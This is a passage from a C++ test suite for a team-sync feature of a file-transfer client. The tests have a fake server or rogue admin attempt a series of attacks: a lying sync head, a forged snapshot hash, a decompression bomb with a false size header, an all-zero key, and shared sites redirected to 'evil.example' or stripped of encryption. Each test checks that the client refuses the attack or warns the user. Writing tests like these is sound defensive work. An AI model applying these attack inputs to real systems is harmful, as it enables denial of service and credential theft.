  T.Key = S.Key;
  qint64 BobSeq = T.Roster.Seq;
  qint64 Real = T.Head;
  Srv->CheckHead = false;
  Srv->OnRequest = [&](const QString & Request)
  {
    if (Request.endsWith(QStringLiteral("/sync/head"))) T.Head = 1000000;
    else if (Request.contains(QStringLiteral("/roster"))) T.Head = Real;
  };
  // the list says the same as the head route
  T.ServeHead = 1000000;
  QString Error;
  CHECK(!SyncAll(&Error));
  CHECK(Wait([&](const auto & D) { Teams().SetRole(S.Uuid, S.Bob.Uuid, QStringLiteral("member"), D); }, &Error) || true);
  Srv->OnRequest = nullptr;
  T.Head = Real;
  T.ServeHead = -1;
  TeamRoster::Entry Last;
  CHECK(TeamRoster::Parse(T.Entries.last().toObject(), Last));
  CHECK(Last.Type == QStringLiteral("role"));
  CHECK(Last.Data.value(QStringLiteral("head")).toInteger() == Real);
  CHECK(SyncAll());
  // the demoted admin, as if before the demotion, later on
  Srv->Publish(T, T.Head + 1, Srv->PeerSnapshot(S.Bob, T, T.Head + 1, Content(QStringLiteral("Prod"), {{"db", "evil.example", "pw"}}), QByteArray(), BobSeq), 1);
  CHECK(!SyncAll(&Error));
  CHECK(Site(S.Folder + QStringLiteral("/db"))->HostName == QStringLiteral("db.internal"));
}

// The sha256 in a list is what a committer typed: an admin cannot brick a team with it
static void ScenarioShaLie()
{
  Boot();
  Setup S = OwnedTeam(QStringLiteral("admin"));
  FakeTeam & T = Srv->Teams[S.Uuid];
  T.Key = S.Key;
  Srv->PeerPush(S.Bob, S.Uuid, Content(QStringLiteral("Prod"), {{"db", "db.internal", "pw"}}));
  QByteArray Real = Sha(T.Snapshots.value(T.Head)).toLatin1();
  Srv->TeamsRaw = Srv->ListTeams().replace(Real, QByteArray(64, '0'));
  QString Error;
  for (int I = 0; I < 3; I++)
  {
    CHECK(SyncAll(&Error));
  }
  CHECK(Teams().Find(S.Uuid)->Error.isEmpty());
  // what goes up next continues what was verified, not what was listed
  Site(S.Folder + QStringLiteral("/db"))->RemoteDirectory = QStringLiteral("/next");
  Configuration::Instance().Save();
  qint64 Head = T.Head;
  CHECK(SyncAll(&Error));
  CHECK(T.Head == Head + 1);
  TeamCrypto::Snapshot Header;
  CHECK(TeamCrypto::ReadSnapshot(T.Snapshots.value(T.Head), Header));
  CHECK(Header.Previous == QString::fromLatin1(Real));
}

static void ScenarioBomb()
{
  QByteArray Key = TeamCrypto::NewTeamKey();
  TeamCrypto::SignKey Author = TeamCrypto::NewSignKey();
  QByteArray Header = R"({"fmt":2,"team":"x"})";
  QByteArray Prefix("NXT2");
  char Length[4];
  qToLittleEndian<quint32>(static_cast<quint32>(Header.size()), Length);
  Prefix.append(Length, 4);
  Prefix.append(Header);
  auto Blob = [&](const QByteArray & Inner)
  {
    QByteArray Signed = Prefix + CloudCrypto::Seal(Key, Inner, Prefix);
    return Signed + TeamCrypto::Sign(Author, QByteArrayLiteral("NXT2-SNAPSHOT|") + Signed);
  };
  // a block of what inflates far past the limit, claiming a small size
  QByteArray Compressed;
  {
    QByteArray Big(200 * 1024 * 1024, 'A');
    Compressed = qCompress(Big, 9);
  }
  qToBigEndian<quint32>(100, Compressed.data());
  QByteArray Plain;
  QString Error;
  CHECK(!TeamCrypto::DecodeSnapshot(Blob(Compressed), Key, Plain, &Error));
  CHECK(Plain.isEmpty());
  // and the same inside the packed form, as one oversized block
  char Number[4];
  qToBigEndian<quint32>(100, Number);
  QByteArray Packed(Number, 4);
  qToBigEndian<quint32>(static_cast<quint32>(Compressed.size()), Number);
  Packed.append(Number, 4);
  Packed.append(Compressed);
  CHECK(!TeamCrypto::DecodeSnapshot(Blob(Packed), Key, Plain, &Error));
  CHECK(Plain.isEmpty());
  // what is genuine still decodes
  TeamCrypto::Snapshot H;
  H.Team = NewUuid();
  H.Version = 1;
  H.KeyVersion = 1;
  H.Author = NewUuid();
  H.RosterSeq = 1;
  H.SavedAt = QDateTime::currentDateTimeUtc();
  QByteArray Genuine(300000, 'x');
  CHECK(TeamCrypto::DecodeSnapshot(TeamCrypto::EncodeSnapshot(H, Key, Author, Genuine), Key, Plain, &Error));
  CHECK(Plain == Genuine);
}

// A key nothing can be wrapped for keeps nobody from renewing the team key
static void ScenarioLowOrderBox()
{
  Boot();
  Setup S = OwnedTeam();
  FakeTeam & T = Srv->Teams[S.Uuid];
  T.Key = S.Key;
  Peer Zed = NewPeer(QStringLiteral("zed"));
  Zed.Box.Public = QByteArray(32, '\0');
  CHECK(TeamCrypto::WrapForMember(Zed.Box.Public, S.Key, S.Uuid, 1).isEmpty());
  Peer Carol = NewPeer(QStringLiteral("carol"));
  Srv->PeerJoin(Carol, InviteCode(S.Uuid, QStringLiteral("member")));
  TeamCrypto::Invite Code;
  CHECK(TeamCrypto::ParseInviteCode(InviteCode(S.Uuid, QStringLiteral("member")), Code));
  QByteArray Junk(92, 'j');
  TeamCrypto::SignKey InviteKey = TeamCrypto::InviteSignKey(Code);
  Srv->Append(T, TeamRoster::Make(T.Roster, T.Uuid, QStringLiteral("join"), Zed.Uuid, TeamRoster::JoinData(Code.Id, Zed.Email, Zed.Identity, Zed.Uuid, Zed.Box.Public, Junk), Zed.Identity, &InviteKey));
  T.Wraps.insert(Zed.Uuid, Junk);
  Srv->Invites[Code.Id].Used = true;
  QString Error;
  CHECK(SyncAll(&Error));
  auto List = std::make_shared<QJsonArray>();
  auto Done = std::make_shared<int>(0);
  Teams().Members(S.Uuid, [List, Done](bool Ok, const QString &, const QJsonArray & Members) { *List = Members; *Done = Ok ? 1 : 2; });
  Spin([Done]() { return *Done != 0; });
  bool Flagged = false;
  for (const QJsonValue & V : *List)
  {
    Flagged = Flagged || ((V.toObject()["user_uuid"].toString() == Zed.Uuid) && V.toObject()["unusable"].toBool());
  }
  CHECK(Flagged);
  // someone leaves: the rotation covers everyone it can, and goes through
  Srv->Append(T, TeamRoster::Make(T.Roster, T.Uuid, QStringLiteral("leave"), Carol.Uuid, QJsonObject{{"head", T.Head}}, Carol.Identity));
  T.Wraps.remove(Carol.Uuid);
  CHECK(SyncAll(&Error));
  CHECK(T.Roster.KeyVersion == 2);
  QByteArray NewKey = Teams().Find(S.Uuid)->Key.View();
  CHECK(TeamCrypto::UnwrapForMember(S.Bob.Box, T.Wraps.value(S.Bob.Uuid), S.Uuid, 2) == NewKey);
  CHECK(T.Wraps.value(Zed.Uuid) == Junk);
}

static QByteArray FtpSite(const QString & Name, int Ftps, const QString & Key)
{
  IniFile Ini;
  SessionData D;
  D.HostName = QStringLiteral("ftp.internal");
  D.UserName = QStringLiteral("deploy");
  D.Password = QStringLiteral("pw");
  D.FSProtocol = fsFTP;
  D.Ftps = static_cast<TFtps>(Ftps);
  D.HostKey = Key;
  CHECK(TeamContent::AddSite(Ini, Name, D));
  return TeamContent::Encode(QStringLiteral("Shared"), Ini);
}

// Every member hears when a shared site points elsewhere or loses protection
static void ScenarioChangesAreTold()
{
  Boot();
  Joined J = MemberOf(QStringLiteral("Shared"), {{"db", "db.internal", "pw"}, {"a", "a.internal", "pw"}, {"b", "b.internal", "pw"}, {"c", "c.internal", "pw"}, {"d", "d.internal", "pw"}, {"e", "e.internal", "pw"}});
  CHECK(SyncAll());
  auto Told = []() { return Notices.join(QLatin1Char('\n')); };
  // a case change of the name with a new host: the same site, and the agent stays home
  Site(J.Folder + QStringLiteral("/db"))->AgentFwd = true;
  Configuration::Instance().Save();
  CHECK(SyncAll());
  Notices.clear();
  QList<QStringList> List{{"DB", "evil.example", "pw"}, {"a", "a.internal", "pw"}, {"b", "b.internal", "pw"}, {"c", "c.internal", "pw"}, {"d", "d.internal", "pw"}, {"e", "e.internal", "pw"}};
  Srv->PeerPush(J.Owner, J.Uuid, Content(QStringLiteral("Shared"), List));
  CHECK(SyncAll());
  CHECK_MSG(Told().contains(QStringLiteral("evil.example")), Told());
  CHECK(Told().contains(QStringLiteral("db.internal")));
  CHECK(!Site(J.Folder + QStringLiteral("/DB"))->AgentFwd);
  // a local change of a member hides nothing
  Site(J.Folder + QStringLiteral("/a"))->RemoteDirectory = QStringLiteral("/mine");
  Configuration::Instance().Save();
  Notices.clear();
  List[1][1] = QStringLiteral("evil-a.example");
  Srv->PeerPush(J.Owner, J.Uuid, Content(QStringLiteral("Shared"), List));
  CHECK(SyncAll());
  CHECK_MSG(Told().contains(QStringLiteral("evil-a.example")), Told());
  // and many at once
  Notices.clear();
  for (int I = 0; I < List.size(); I++) List[I][1] = QStringLiteral("e%1.example").arg(I);
  Srv->PeerPush(J.Owner, J.Uuid, Content(QStringLiteral("Shared"), List));
  CHECK(SyncAll());
  CHECK(Told().contains(QStringLiteral("1 more")));
  CHECK_MSG(Told().count(QStringLiteral("now connects to")) == 5, Told());
  // the encryption and the host key, with the address unchanged
  Srv->PeerPush(J.Owner, J.Uuid, FtpSite(QStringLiteral("f"), 3, QString()));
  CHECK(SyncAll());
  Notices.clear();
  Srv->PeerPush(J.Owner, J.Uuid, FtpSite(QStringLiteral("f"), 0, QString()));
  CHECK(SyncAll());
  CHECK_MSG(Told().contains(QStringLiteral("not encrypted")), Told());
  Srv->PeerPush(J.Owner, J.Uuid, FtpSite(QStringLiteral("f"), 1, QString()));
  CHECK(SyncAll());
  Notices.clear();
  Srv->PeerPush(J.Owner, J.Uuid, FtpSite(QStringLiteral("f"), 3, QString()));
  CHECK(SyncAll());
  CHECK_MSG(Told().contains(QStringLiteral("encryption")), Told());
  Srv->PeerPush(J.Owner, J.Uuid, FtpSite(QStringLiteral("f"), 3, QStringLiteral("ssh-ed25519 255 SHA256:abcdefghijklmnopqrstuvwxyz0123456789ABCDEFG")));
  Notices.clear();
  CHECK(SyncAll());
  CHECK_MSG(Told().contains(QStringLiteral("host key")), Told());
  // what is only a note says nothing of that kind
  Notices.clear();
  Srv->PeerPush(J.Owner, J.Uuid, FtpSite(QStringLiteral("f"), 3, QStringLiteral("ssh-ed25519 255 SHA256:abcdefghijklmnopqrstuvwxyz0123456789ABCDEFG")) + "Note=hello\n");
  CHECK(SyncAll());
  CHECK(Notices.isEmpty());
}

// Replaying a chain is linear, and a server cannot make it endless
static void ScenarioRosterScale()
{
  Peer Owner = NewPeer(QStringLiteral("owner"));
  QString Uuid = NewUuid();
  QByteArray Wrap(92, 'w');
  TeamRoster::State S;
  QJsonArray Wire;
  auto Add = [&](const TeamRoster::Entry & Item)
  {
    QString Why;
    bool Ok = TeamRoster::Apply(S, Item, &Why);
    CHECK_MSG(Ok, Why);
    Wire.append(TeamRoster::ToWire(Item));
  };
  Add(TeamRoster::Make(S, Uuid, QStringLiteral("create"), Owner.Uuid, TeamRoster::CreateData(Owner.Email, Owner.Identity, Owner.Uuid, Owner.Box.Public, Wrap), Owner.Identity));
  TeamCrypto::SignKey Public = TeamCrypto::NewSignKey();
  QString Expires = QDateTime::currentDateTimeUtc().addDays(3).toString(QStringLiteral("yyyy-MM-ddTHH:mm:ss.zzzZ"));
  auto Grow = [&](int Size)
  {
    while (Wire.size() < Size)
    {
      QString Id = TeamCrypto::NewInvite().Id;
      Add(TeamRoster::Make(S, Uuid, QStringLiteral("invite"), Owner.Uuid, QJsonObject{{"id", Id}, {"role", "member"}, {"expires", Expires}, {"public", B64(Public.Public)}, {"key_version", 1}}, Owner.Identity));
      Add(TeamRoster::Make(S, Uuid, QStringLiteral("revoke"), Owner.Uuid, QJsonObject{{"invite", Id}}, Owner.Identity));
    }
  };
  auto Measure = [&]()
  {
    QElapsedTimer Timer;
    Timer.start();
    TeamRoster::State Result;
    QString Why;
    bool Ok = TeamRoster::Replay(Wire, Uuid, Result, nullptr, &Why);
    CHECK_MSG(Ok, Why);
    return Timer.elapsed();
  };
  Grow(4000);
  qint64 Small = Measure();
  Grow(16000);
  qint64 Large = Measure();
  std::printf("  Replay: 4000 entries %lld ms, 16000 entries %lld ms\n", static_cast<long long>(Small), static_cast<long long>(Large));
  // four times the entries: about four times the work, sixteen when it is quadratic
  CHECK_MSG(Large < Small * 8 + 200, QStringLiteral("%1 %2").arg(Small).arg(Large));
  // a refused entry changes nothing, without a copy of the state to fall back on
  TeamRoster::State Before = S;
  QJsonObject Wraps{{Owner.Uuid, QStringLiteral("not a hash")}};
  CHECK(!TeamRoster::Apply(S, TeamRoster::Make(S, Uuid, QStringLiteral("rotate"), Owner.Uuid, QJsonObject{{"key_version", 2}, {"wraps", Wraps}}, Owner.Identity)));
  CHECK((S.Seq == Before.Seq) && (S.KeyVersion == 1) && (S.Find(Owner.Uuid)->WrapHash == Before.Find(Owner.Uuid)->WrapHash));
  // more than any server may store
  QJsonArray Endless;
  for (int I = 0; I <= TeamRoster::MaxEntries; I++)
  {
    Endless.append(QJsonValue());
  }
  QString Why;
  TeamRoster::State Result;
  CHECK(!TeamRoster::Replay(Endless, Uuid, Result, nullptr, &Why));
  CHECK(Why.contains(QStringLiteral("too long")));
}

//---------------------------------------------------------------------------

struct Scenario
{
  const char * Name;
  void (*Run)();
};

static const Scenario Scenarios[] = {
  {"server-key", ScenarioServerKey},
  {"rotate-flag", ScenarioRotateFlag},
  {"member-wrap", ScenarioMemberWrap},
  {"forged-snapshot", ScenarioForgedSnapshot},
  {"former-admin", ScenarioFormerAdmin},
  {"fake-team", ScenarioFakeTeam},
  {"join-anchor", ScenarioJoinAnchor},
  {"rogue-member", ScenarioRogueMember},
  {"stolen-account", ScenarioStolenAccount},
  {"rollback", ScenarioRollback},
  {"key-rollback", ScenarioKeyRollback},
  {"pins-survive", ScenarioPinsSurvive},
  {"same-names", ScenarioSameNames},
  {"rename-attack", ScenarioRenameAttack},
  {"rename-by-other", ScenarioRenameByOther},
  {"rename-spaces", ScenarioRenameSpaces},
  {"marker", ScenarioMarker},
  {"push-allow-list", ScenarioPushAllowList},
  {"change-notice", ScenarioChangeNotice},
  {"no-churn", ScenarioNoChurn},
  {"member-no-churn", ScenarioMemberNoChurn},
  {"rotate-head", ScenarioRotateHead},
  {"rotate-local-edit", ScenarioRotateLocalEdit},
  {"rotate-fails", ScenarioRotateFails},
  {"no-key-admin", ScenarioNoKeyAdmin},
  {"move-commits", ScenarioMoveCommits},
  {"move-conflict", ScenarioMoveConflict},
  {"bad-list", ScenarioBadList},
  {"removed", ScenarioRemoved},
  {"gone-keeps-edits", ScenarioGoneKeepsEdits},
  {"errors", ScenarioErrors},
  {"conflict", ScenarioConflict},
  {"late-conflict", ScenarioLateConflict},
  {"key-mismatch", ScenarioKeyMismatch},
  {"empty-guard", ScenarioEmptyGuard},
  {"restore", ScenarioRestore},
  {"share-collision", ScenarioShareCollision},
  {"account-change", ScenarioAccountChange},
  {"many-sites", ScenarioManySites},
  {"leave-during-sync", ScenarioLeaveDuringSync},
  {"queued-operation", ScenarioQueuedOperation},
  {"save-fails", ScenarioSaveFails},
  {"key-race", ScenarioKeyRace},
  {"fingerprints-notices", ScenarioFingerprintsNotices},
  {"bad-chain-delete", ScenarioBadChainDelete},
  {"bad-chain-forget", ScenarioBadChainForget},
  {"pin-floor", ScenarioPinFloor},
  {"pin-floor-recovers", ScenarioPinFloorRecovers},
  {"join-floor", ScenarioJoinFloor},
  {"content-floor", ScenarioContentFloor},
  {"stale-demote", ScenarioStaleDemote},
  {"fold-exfil", ScenarioFoldExfil},
  {"fold-inject", ScenarioFoldInject},
  {"lookalikes", ScenarioLookalikes},
  {"leave-trap", ScenarioLeaveTrap},
  {"demote-race", ScenarioDemoteRace},
  {"remove-race", ScenarioRemoveRace},
  {"head-lie", ScenarioHeadLie},
  {"sha-lie", ScenarioShaLie},
  {"bomb", ScenarioBomb},
  {"low-order-box", ScenarioLowOrderBox},
  {"changes-are-told", ScenarioChangesAreTold},
  {"roster-scale", ScenarioRosterScale},
};

int main(int argc, char ** argv)
{
  QCoreApplication App(argc, argv);
  QStringList Args = App.arguments();
  if (Args.size() == 3)
  {
    Dir = Args[2];
    Fake Server;
    Server.Start();
    Srv = &Server;
    qputenv("NIXSCP_CLOUD_URL", Server.Base.toLatin1());
    for (const Scenario & Item : Scenarios)
    {
      if (Args[1] == QLatin1String(Item.Name))
      {
        Item.Run();
      }
    }
    std::fflush(stdout);
    _exit((Failures == 0) ? 0 : 1);
  }
  QString Only = (Args.size() == 2) ? Args[1] : QString();
  int Failed = 0;
  for (const Scenario & Item : Scenarios)
  {
    if (!Only.isEmpty() && (Only != QLatin1String(Item.Name)))
    {
      continue;
    }
    QTemporaryDir Temporary;
    QProcess Process;
    Process.setProcessChannelMode(QProcess::ForwardedChannels);
    Process.start(App.applicationFilePath(), {QLatin1String(Item.Name), Temporary.path()});
    Process.waitForFinished(180000);
    bool Ok = (Process.exitStatus() == QProcess::NormalExit) && (Process.exitCode() == 0);
    std::printf("scenario %s: %s\n", Item.Name, Ok ? "ok" : "FAILED");
    std::fflush(stdout);
    Failed += Ok ? 0 : 1;
  }
  if (Failed == 0)
  {
    std::printf("All hostile teams tests passed\n");
  }
  return (Failed == 0) ? 0 : 1;
}
